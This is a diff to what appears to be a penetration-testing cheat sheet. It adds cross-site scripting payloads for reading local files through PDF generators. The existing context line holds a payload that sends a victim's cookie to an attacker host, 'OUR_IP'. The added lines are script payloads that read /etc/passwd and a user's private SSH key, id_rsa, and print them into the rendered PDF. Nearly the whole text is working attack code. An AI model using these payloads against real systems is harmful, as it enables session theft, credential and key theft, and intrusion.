@@ -126,3 +126,13 @@ xss payload:
 ```
 "><script>document.location='http://OUR_IP/index.php?c='+document.cookie;</script>
 ```
+### Local File Read via XSS in Dynamiically Generated PDF
+```
+<p id='aa'>aa</p><script>document.getElementById('aa').innerHTML+='aa'</script>
+
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/passwd');x.send();</script>
+
+<script>x=new XMLHttpRequest;x.onload=function(){code="<textarea rows='100' cols='70'>"+btoa(x.responseText)+"</textarea>";document.write(code);};x.open('GET','file:///home/reader/.ssh/id_rsa', true);x.send();</script>
+
+<script>x=new XMLHttpRequest;x.onload=function(){code="<textarea rows='100' cols='70'>"+x.responseText+"</textarea>";document.write(code);};x.open('GET','file:///home/reader/.ssh/id_rsa', true);x.send();</script>
+```
